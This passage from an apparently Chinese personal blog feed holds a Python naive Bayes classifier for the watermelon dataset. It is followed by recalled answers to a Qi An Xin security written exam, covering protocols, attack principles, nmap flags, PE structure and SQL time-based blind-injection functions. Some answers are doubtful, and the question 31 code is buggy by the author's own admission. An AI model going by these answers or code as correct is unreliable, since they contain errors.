class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;硬挺&#x27;</span>,<span class="string">&#x27;清脆&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;平坦&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;硬挺&#x27;</span>,<span class="string">&#x27;清脆&#x27;</span>,<span class="string">&#x27;模糊&#x27;</span>,<span class="string">&#x27;平坦&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;模糊&#x27;</span>,<span class="string">&#x27;平坦&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;模糊&#x27;</span>,<span class="string">&#x27;平坦&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>]]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#注意路径</span></span><br><span class="line">    <span class="comment">#filename = &quot;./西瓜3.0.csv&quot;</span></span><br><span class="line">    <span class="comment">#sampleset = []</span></span><br><span class="line">    <span class="comment">#with open(filename) as f:</span></span><br><span class="line">    <span class="comment">#    #csv.reader()读取文件中的每行作为列表返回，reader相当于指向那堆列表的指针</span></span><br><span class="line">    <span class="comment">#    reader = csv.reader(f)</span></span><br><span class="line">    <span class="comment">#    #读取首行并将reader指针指向下一行</span></span><br><span class="line">    <span class="comment">#    header_row = next(reader)</span></span><br><span class="line">    <span class="comment">#    #遍历reader指针指向的那堆列表，将每个列表中下标为1至末尾的元素作为新列表加入到样本集中</span></span><br><span class="line">    <span class="comment">#    for line in reader:</span></span><br><span class="line">    <span class="comment">#        sampleset.append(line[1:])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sampleset</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DataPreprocessing</span>(<span class="params">sampleset</span>):</span><br><span class="line">    <span class="comment">#将样本集打乱</span></span><br><span class="line">    random.shuffle(sampleset)</span><br><span class="line">    <span class="comment">#90%作为训练集，10%作为测试集</span></span><br><span class="line">    split_index = <span class="built_in">int</span>(<span class="built_in">len</span>(sampleset)*<span class="number">0.9</span>)</span><br><span class="line">    trainset = sampleset[:split_index]</span><br><span class="line">    testset = sampleset[split_index:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> trainset, testset</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bayes</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, trainset, testset, n=<span class="number">1</span></span>):</span><br><span class="line">        self.trainset = trainset</span><br><span class="line">        self.testset = testset</span><br><span class="line">        self.n = n</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算先验概率</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cal_prior_prob</span>(<span class="params">self, trainset</span>):</span><br><span class="line">        labellist = [trainset[i][-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trainset))]</span><br><span class="line">        labeldict = &#123;&#125;</span><br><span class="line">        <span class="comment">#按类别分类并且计算各类别的样本数</span></span><br><span class="line">        <span class="keyword">for</span> label <span class="keyword">in</span> labellist:</span><br><span class="line">            <span class="keyword">if</span> label <span class="keyword">not</span> <span class="keyword">in</span> labeldict:</span><br><span class="line">                labeldict[label] = <span class="number">0</span></span><br><span class="line">            labeldict[label] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#计算各类别的先验概率</span></span><br><span class="line">        labelpriorprob = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> label <span class="keyword">in</span> labeldict.keys():</span><br><span class="line">            labelpriorprob[label] = (labeldict[label] + self.n) / (<span class="built_in">len</span>(trainset) + <span class="built_in">len</span>(self.testset) * self.n)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;类别的先验概率为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(labelpriorprob)</span><br><span class="line">        <span class="keyword">return</span> labelpriorprob</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#计算条件概率</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cal_cond_prob</span>(<span class="params">self, trainset</span>):</span><br><span class="line">        <span class="comment">#fea_num表示特征数，-1是减去最后那个类别，它不属于特征</span></span><br><span class="line">        fea_num = <span class="built_in">len</span>(trainset[<span class="number">0</span>]) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#用二维数组存储每个特征有哪几个特征值</span></span><br><span class="line">        fealist = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(fea_num):</span><br><span class="line">            fealist.append([])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trainset)):</span><br><span class="line">                <span class="keyword">if</span> trainset[j][i] <span class="keyword">not</span> <span class="keyword">in</span> fealist[i]:</span><br><span class="line">                    fealist[i].append(trainset[j][i])</span><br><span class="line">        <span class="comment">#print(fealist)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#按类别区分训练集</span></span><br><span class="line">        separated = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trainset)):</span><br><span class="line">            row_vetor = trainset[i]</span><br><span class="line">            <span class="keyword">if</span> row_vetor[-<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> separated:</span><br><span class="line">                separated[row_vetor[-<span class="number">1</span>]] = []</span><br><span class="line">            separated[row_vetor[-<span class="number">1</span>]].append(row_vetor[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#创建一个字典存各个特征值的条件概率</span></span><br><span class="line">        feacondprob = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#每个特征中又有不同的特征值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> separated.keys():<span class="comment">#i表示字典中的关键字“是”或“否”</span></span><br><span class="line">            <span class="comment">#“是”一个列表，“否”一个列表，最后综合到feacondprob字典中</span></span><br><span class="line">            temp = []</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;0&#125;&#x27;类别的各特征的条件概率为：&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(fea_num):<span class="comment">#k表示样本中有多少个特征</span></span><br><span class="line">                <span class="comment">#每个特征创建一个字典计算不同特征值的个数</span></span><br><span class="line">                feadict = &#123;&#125;</span><br><span class="line">                <span class="comment">#初始化字典关键字</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fealist[k])):</span><br><span class="line">                    <span class="keyword">if</span> fealist[k][j] <span class="keyword">not</span> <span class="keyword">in</span> feadict:</span><br><span class="line">                        feadict[fealist[k][j]] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(separated[i])):<span class="comment">#这里的j表示在“是”或“否”中的第j个样本                    </span></span><br><span class="line">                    feadict[separated[i][j][k]] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">#计算各特征的条件概率</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> feadict.keys():</span><br><span class="line">                    feadict[j] = (feadict[j] + self.n) / (<span class="built_in">len</span>(separated[i]) + <span class="built_in">len</span>(feadict) * self.n)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(feadict)</span><br><span class="line">                </span><br><span class="line">                temp.append(feadict)</span><br><span class="line">            </span><br><span class="line">            feacondprob[i] = temp</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> feacondprob</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, trainset, testset</span>):</span><br><span class="line">        labelpriorprob = self.cal_prior_prob(trainset)</span><br><span class="line">        feacondprob = self.cal_cond_prob(trainset)</span><br><span class="line">        testlabels = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(testset)):<span class="comment">#i表示测试集样本的个数</span></span><br><span class="line">            bayesProbability = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> label <span class="keyword">in</span> labelpriorprob:</span><br><span class="line">                tempProb = labelpriorprob[label]</span><br><span class="line">                featureList = feacondprob[label]</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(testset[<span class="number">0</span>])-<span class="number">1</span>):<span class="comment">#k表示要计算几个特征</span></span><br><span class="line">                    tempProb *= featureList[k][testset[i][k]]</span><br><span class="line">                </span><br><span class="line">                bayesProbability[label] = tempProb</span><br><span class="line">            </span><br><span class="line">            result = <span class="built_in">sorted</span>(bayesProbability.items(), key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;测试样本&#123;0&#125;的各类别概率：&quot;</span>.<span class="built_in">format</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            testlabels.append(result[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> testlabels</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sampleset = CreateData()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;样本集为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sampleset)</span><br><span class="line">    trainset, testset = DataPreprocessing(sampleset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;其中训练集为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(trainset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;其中测试集为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(testset)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#用极大似然法估计参数</span></span><br><span class="line">    bayes = Bayes(trainset, testset, n=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;使用最大似然法判断测试集类别：&quot;</span>)</span><br><span class="line">    testlabels = bayes.predict(trainset, testset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;测试集各实例点的最终结果：&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(testlabels))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#用拉普拉斯平滑估计参数（默认）</span></span><br><span class="line">    bayes = Bayes(trainset, testset, n=<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;使用拉普拉斯平滑判断测试集类别：&quot;</span>)</span><br><span class="line">    testlabels = bayes.predict(trainset, testset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;测试集各实例点的最终结果：&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(testlabels))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;做的时候很痛苦，但完全是自己写出来的算法真的很有成就感呜呜呜！感谢简博士清晰易懂的例题讲解，让我懂得它的原理。&lt;/p&gt;
&lt;p&gt;经过这个算法我也清楚了Python列表与字典该在哪种情况下使用哪个，非常不错~&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>奇安信安全方向笔试题</title>
    <link href="http://example.com/posts/7b52fae7.html"/>
    <id>http://example.com/posts/7b52fae7.html</id>
    <published>2022-05-06T04:40:43.409Z</published>
    <updated>2022-05-07T14:42:37.259Z</updated>
    
    <content type="html"><![CDATA[<p>笔试主要内容：网络协议、操作系统、攻击原理</p><p>认真对待每次笔试和面试，积累经验，小凉一定不会失业的！一定可以找到适合自己的工作的！</p><span id="more"></span><h1 id="【2020】奇安信秋招研发安全方向试卷1"><a href="#【2020】奇安信秋招研发安全方向试卷1" class="headerlink" title="【2020】奇安信秋招研发安全方向试卷1"></a>【2020】奇安信秋招研发安全方向试卷1</h1><p>1.以下哪些字段不是IP头部中的内容( D )</p><p>A. 版本、报文长度；B. 服务类型、标识；C. 源地址、目标地址；D. 源端口、目标端口</p><p>解析：</p><img src="/posts/7b52fae7/1.1.1.png" class="" title="IP头部结构"><p>2.下列选项中，TCP标志位组合不正确的是( C )</p><p>A. SYN+ACK；B. PUSH+ACK；C. SYN+RST；D. FIN+ACK</p><p>解析：没有[SYN, RST]包，有[RST, ACK]包。</p><p>3.TCP SYN拒绝服务攻击是指发起TCP链接后不管，重复不停发送链接。</p><p>4.分片IP报文攻击是指将大报文拆分成小报文片段，只发送一部分给被攻击者。</p><p>5.永恒之蓝利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。</p><p>6.ARP攻击造成网络无法跨网段通信的原因是伪造网关 ARP 报文使得数据包无法发送到网关。</p><p>7.Ping of death攻击的原理是操作系统平台未对分片进行参数检查。</p><p>8.Linux下可用的抓包工具是tcpdump、tshark和wireshark。</p><p>9.nmap扫描参数中，T5参数扫描最快。</p><p>解析：nmap的常见参数汇总：<br>端口状态概述<br>open 开放；closed 关闭；filtered 被过滤掉了，无法进行判断；unfiltered 未被过滤可以进行访问</p><p>参数：<br>1、-Pn 跳过主机发现，视为所有的主机都在线<br>2、-sn 只做ping扫描不做端口扫描<br>3、-sT\A\W\M 不同的扫描端口，进行扫描<br>4、-p 指定端口进行扫描 —exclude-ports<port ranges>：排除端口进行扫描<br>5、-sV 探测系统的版本<br>—version-intensity<level>：设置相关的程度，详细级别，0~9 越高越详细<br>—version-trace：打印详细的版本扫描过程<br>6、脚本扫描<br>—scri=<scripts> ：指定对应的脚本名称<br>7、O：激活系统的探测<br>—osscan-limit：只对开放端口的有效主机进行系统的探测<br>8、-T<0-5>：时间模板，越大速度越快<br>9、-6：使能IPV6探测<br>10、-A：使能系统探测、版本检测、脚本扫描、路由追踪<br>11、-V：打印版本号<br>12、-v：增加输出的详细程度</p><p>10.以下哪个不是PE文件结构( D )</p><p>A. 导入表；B. 导出表；C. 重定位表；D. 字符串表</p><p>解析：PE文件结构分为五个部分：DOS文件头、DOS加载模块、PE文件头、区段表、区段。区段表相当于区段的目录，里面包含着每个区段的信息。</p><blockquote><p>.text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code<br>.data：初始化的数据块，包含那些编译时被初始化的变量、字符串<br>.idata：导入表，包含程序调用的第三方dll的函数的信息。<br>.rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。<br>.reloc：重定位表，用于保存基址的重定位表。即当装载程序不能按照连接器所指定的地址装载文件时，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装载则忽略此段中的数据。<br>.edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态链接库文件中。<br>.rdata：系统函数的导入表，程序调用的系统dll中的函数的具体信息。</p></blockquote><p>11.当前进程页目录地址保存在CR3中。</p><p>解析：</p><img src="/posts/7b52fae7/1.11.1.png" class="" title="控制寄存器"><p><strong>CR0</strong><br>是系统内的控制寄存器之一。控制寄存器是一些特殊的寄存器，它们可以控制CPU的一些重要特性。<br>第0位是保护允许位PE(Protedted Enable)，用于启动保护模式，如果PE位置1，则保护模式启动，如果PE=0，则在实模式下运行。<br>第1位是监控协处理位MP(Moniter coprocessor)，它与第3位一起决定：当TS=1时操作码WAIT是否产生一个“协处理器不能使用”的出错信号。第3位是任务转换位(Task Switch)，当一个任务转换完成之后，自动将它置1。随着TS=1，就不能使用协处理器。<br>第2位是模拟协处理器位 EM (Emulate coprocessor)，如果EM=1，则不能使用协处理器，如果EM=0，则允许使用协处理器。<br>第4位是微处理器的扩展类型位 ET(Processor Extension Type)，其内保存着处理器扩展类型的信息，如果ET=0，则标识系统使用的是287协处理器，如果 ET=1，则表示系统使用的是387浮点协处理器。<br>第31位是分页允许位(Paging Enable)，它表示芯片上的分页部件是否允许工作。<br>第16位是写保护未即WP位(486系列之后)，只要将这一位置0就可以禁用写保护，置1则可将其恢复。</p><p><strong>CR1</strong><br>是未定义的控制寄存器，供将来的处理器使用。</p><p><strong>CR2</strong><br>是页故障线性地址寄存器，保存最后一次出现页故障的全32位线性地址。</p><p><strong>CR3</strong><br>是页目录基址寄存器，保存页目录表的物理地址，页目录表总是放在以4K字节为单位的存储器边界上，因此，它的地址的低12位总为0，不起作用，即使写上内容，也不会被理会。</p><p><strong>CR4</strong><br>在Pentium系列（包括486的后期版本）处理器中才实现，它处理的事务包括诸如何时启用虚拟8086模式等。</p><p>12.以下哪个选项用于解决缓解间接调用和调用不可靠目标的问题( D )</p><p>A. ASLR；B. EDP；C. GS； D. CFG</p><p>解析：CFG（Control Flow Guard）控制流防护，是微软在Windows8.0以及Windows10上推出的新的防护机制。防护点在于，防护间接调用，防止在程序间接调用函数的时候，使用恶意代码进行替换，导致执行恶意程序。CFG的实现机制在于每当存在间接调用的函数的时候，就会先去判断一下间接调用的地址处是不是一个有效的函数的起始地址。</p><p>13.Windbg中通过哪条命令监控指定dll加载( A )</p><p>A. sxe；B. lm；C. reload；D. pct</p><p>解析：</p><p>sxe：与dll加载有关</p><p>lm：用来查看库的信息，比如库的路径、时间戳、库的加载地址等。一般使用模糊匹配的模式。</p><p>.reload：删除指定模块的所有符号信息，并且按需要重新加载这些符号。</p><p>pct：执行程序，直到它到达调用指令或返回指令。</p><p>14.WEB漏洞扫描工具通过网络爬虫测试web应用系统，检测常见的Web应用漏洞。常见的WEB漏洞扫描工具有：AppScan、Netsparker、Nikto、WebInspect。</p><p>15.关于OWASP Top 10 2017 十项最严重的Web 应用程序安全风险，以下哪种漏洞类型不在范围内？( E )</p><p>A. 不安全的反序列化；B. XML外部实体注入；C. 使用了已知漏洞的组件；D. 敏感数据泄露；E. SSTI</p><p>具体看<a href="https://blog.csdn.net/lilongsy/article/details/79761362">OWASP Top 10 2017 10项最严重的 Web 应用程序安全风险</a></p><p>SSTI是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。引发SSTI的真正原因是<code>render_template</code>渲染函数的问题，渲染函数在渲染的时候，往往对用户输入的变量不做渲染。</p><p>16.对一个文件的访问，常由用户访问权限和文件属性共同限制。</p><p>17.TCP是面向连接的，UDP是面向无连接的；TCP适用于可靠性较高的局域网，UDP适用于可靠性较差的广域网。</p><p>18.面向对象的三大特性：封装、继承、多态。</p><p>面向对象的七(或五大原则，前五项)大基本原则：单一职责原则（Single Function Principle, SFP） 、开放封闭原则（Open-Closed Principle, OCP）  、里氏替换原则（Liskov Substitution Principle, LSP）、  依赖倒置原则（Dependency Inversion Principle, DIP）、接口隔离原则（Inteface Segregation Principle, ISP）、迪米特法则（Law of Demeter, LoD）、组合/聚合复用原则（Composite/Aggregate Reuse Principle, CARP）。详细请看<a href="https://blog.csdn.net/qq_37234501/article/details/115273019">面对对象七大原则</a></p><p>19.以下程序在little-endian架构处理器下的输出是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">char</span> *pc = &amp;i;</span><br><span class="line">pc[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>20.volatile是一个特征修饰符（type specifier）。volatile的作用是作为指令关键字，确保本条指令不会因编译器的优化而省略，且要求每次直接读值。一个变量可以既是const又是volatile。一个指针可以是volatile。当gcc -O0时，volatile起不到作用，因为-O0表示不做任何优化，这是默认的编译选项。</p><p>21.常见的 Web 攻击手段主要有 XSS 攻击、CSRF 攻击、SQL 注入攻击、DDos 攻击、文件漏洞攻击等。</p><p>22.系统入侵攻击的方式有口令攻击、漏洞攻击、木马攻击、后门攻击。</p><p>23.选用比较长和复杂的用户登录口令、使用防病毒软件、尽量避免开放过多的网络服务能减少用户计算机被攻击的可能性。</p><p>24.监听0~1023端口都需要root权限。</p><p>25.修改free hook 等插入的函数指针、非线性修改函数返回地址、使用函数指针进行覆写可能导致Windows 10 上控制流劫持。</p><p>26.内存破坏类漏洞调试分析中的常见技巧有开启heap相关检测选项、内存访问断点、条件断点。</p><p>27.哪些函数或语句是SQL延迟盲注利用中会用到？sleep、benchmark、DBMS_PIPE.RECEIVE_MESSAGE、WAITFOR DELAY。</p><p>28.进出栈顺序，简单。</p><p>29.各种排序算法<strong>空间复杂度</strong>：</p><p>插入排序 = 冒泡排序 = 堆排序 = $O(1)$</p><p>快速排序 = $O(\log N)$</p><p>30.接口是通用的，用来描述方法是干什么用的，方法的默认修饰符为public、abstract。不可以为final是因为方法要被重写。描述符如果为private或者protected，那么子类重写的方法的描述符也可以为private或者protected，这样就是有了访问限制，不符合接口所要达到的的任何人都可以使用的原则。</p><p>31.老板一共需要给某个员工发奖金n元，可以选择一次发1元，也可以选择一次发2元，也可以选择一次发3元。请问老板给这位员工发放完n元奖金共有多少种不同的方法？数据范围：1 &lt;= n &lt;= 10</p><p>分析：可以这样想，发5元怎么发？<strong>不对，再说吧</strong><br>1：先发1块的情况下，剩下4块是不是就和发4块的方法一样了？<br>2：先发2块的情况下，剩下3块是不是就和发3块的方法一样了？<br>3：先发3块的情况下，剩下2块是不是就和发2块的方法一样了？<br>4：先发4块的情况下，剩下1块是不是就和发1块的方法一样了？<br>5：5块一次性发完，唯一方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param num_money int整型 奖金的总数,单位为元</span></span><br><span class="line"><span class="comment"> * @return int整型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * C语言声明定义全局变量请加上static，防止重复定义</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">CalulateMethodCount</span><span class="params">(<span class="type">int</span> num_money )</span> &#123;</span><br><span class="line">    <span class="comment">// write code here</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(num_money &lt; <span class="number">1</span> || num_money &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;奖金的总数有误！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//递归结束条件</span></span><br><span class="line">        <span class="keyword">if</span>(num_money == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//实现f(n)=f(n-1)+f(n-2)+...+f(1)+1</span></span><br><span class="line">            count = count + CalulateMethodCount(num_money<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>32.撤销/恢复操作具有广泛的用途，比如word文档中输入一个单词，可以点撤销，然后可以再恢复。<br>编程实现如下功能：  从标准输入读取到一个字符串，字符串可包含0个或多个单词，单词以空格或者tab分隔； 如果遇到 “undo” 字符串，表示”撤销”操作，前一个字符串被撤销掉； 如果遇到”redo”字符串，表示恢复刚才撤销掉的字符串。<br>例如：输入字符串 “hello undo redo world.”，  对字符串中的 undo 和 redo 处理后， 最终输出的结果为 “hello world.”</p><p>分析：先初始化两个栈stack和redo，然后利用双栈求解。遍历词表：</p><ol><li>遇到普通词就压入stack，并清空redo栈，因为此时写入了一个新词，再往前的词已经找不回来了；</li><li>遇到undo就从stack中弹栈至redo；</li><li>遇到redo就从redo中弹栈至stack。</li></ol><p>最终stack中的词就是最后保留下来的词。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 